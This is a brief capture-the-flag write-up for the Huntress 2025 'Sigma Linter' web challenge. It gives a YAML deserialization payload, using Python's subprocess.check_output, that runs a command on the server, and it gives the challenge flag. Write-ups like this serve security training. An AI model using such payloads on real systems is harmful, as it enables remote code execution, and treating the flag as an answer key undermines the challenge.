---
title: "Huntress_2025 – Sigma_Linter"
layout: post
competition: Huntress_2025
challenge: Sigma_Linter
---

# 🌐 Sigma Linter

|Category         |	Author                |
|-----------------|-----------------------|
|🌐 Web           |John Hammond           |

## Challenge Prompt

Oh wow, another web app interface for command-line tools that already exist!

This one seems a little busted, though...

## Problem Type
- Web command injection

## Solve
From the initial YAML

Change category line to

`category: !!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]`

## Flag
`flag{b692115306c8e5c54a2c8908371a4c72}`


<p align="right">(<a href="#top">back to top</a>)</p>
